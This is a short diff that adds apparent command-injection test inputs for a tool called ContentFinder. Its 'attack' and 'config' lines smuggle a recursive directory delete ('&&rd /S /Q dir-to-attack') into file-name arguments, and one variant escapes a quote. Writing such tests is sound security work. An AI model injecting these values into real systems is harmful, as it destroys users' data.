@@ -1,0 +1,9 @@
+ContentFinder test file3.txt file4.txt file5.txt
+ContentFinder test file3.txt << file5.txt
+
+attack:
+ContentFinder test file3.txt file4.txt "file5.txt&&rd /S /Q dir-to-attack"
+ContentFinder test file3.txt file4.txt "file5.txt\"&&rd /S /Q dir-to-attack"
+
+config:
+file5.txt"&&rd /S /Q dir-to-attack
